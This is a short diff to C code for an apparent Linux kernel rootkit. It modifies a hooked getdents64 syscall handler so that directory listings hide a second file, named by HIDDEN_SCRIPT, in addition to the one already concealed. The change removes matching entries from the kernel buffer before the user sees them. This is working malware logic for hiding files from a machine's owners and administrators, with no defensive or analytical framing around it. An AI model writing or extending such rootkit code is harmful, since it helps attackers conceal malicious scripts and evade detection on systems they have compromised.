@@ -46,7 +46,7 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
 
     while (bpos < ret) {
         cur = (struct linux_dirent64 *)((char *)kbuf + bpos);
-        if (strcmp(cur->d_name, NAME) == 0) {
+        if (strcmp(cur->d_name, NAME) == 0 || strcmp(cur->d_name, HIDDEN_SCRIPT) == 0) {
             unsigned short reclen = cur->d_reclen;
             memmove(cur, (char *)cur + reclen, ret - bpos - reclen);
             ret -= reclen;
